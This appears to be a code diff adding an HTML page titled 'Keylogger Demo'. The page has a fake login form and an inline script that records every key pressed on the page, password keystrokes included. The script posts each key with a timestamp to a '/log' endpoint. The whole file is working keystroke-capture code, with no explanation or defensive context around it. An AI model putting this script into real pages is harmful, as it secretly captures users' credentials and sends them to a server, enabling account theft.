@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Keylogger Demo</title>
+  </head>
+  <body>
+    <h2>Demo Login Page</h2>
+    <form>
+      <input type="text" placeholder="Username" /><br />
+      <input type="password" placeholder="Password" /><br />
+      <input type="submit" value="Login" />
+    </form>
+
+    <script>
+      document.addEventListener("keydown", function (e) {
+        fetch("/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ key: e.key, time: Date.now() }),
+        });
+      });
+    </script>
+  </body>
+</html>
